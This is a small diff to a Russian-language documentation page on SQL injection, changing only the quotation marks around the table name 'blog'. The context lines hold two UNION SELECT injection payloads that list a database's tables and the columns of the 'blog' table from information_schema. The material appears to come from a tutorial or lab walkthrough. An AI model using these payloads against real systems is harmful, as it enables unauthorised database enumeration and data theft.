@@ -24,7 +24,7 @@ sidebar_position: 1
 
 999+UNION+SELECT+NULL,table\_name,NULL,NULL,NULL,NULL,NULL+from+information\_schema.tables+where+table\_schema=database()--+-
 
-У нас есть таблица под названием «blog», проверим столбцы внутри нее
+У нас есть таблица под названием "blog", проверим столбцы внутри нее
 
 999+UNION+SELECT+NULL,column\_name,NULL,NULL,NULL,NULL,NULL+from+information\_schema.columns+where+table\_name='blog'--+-
 
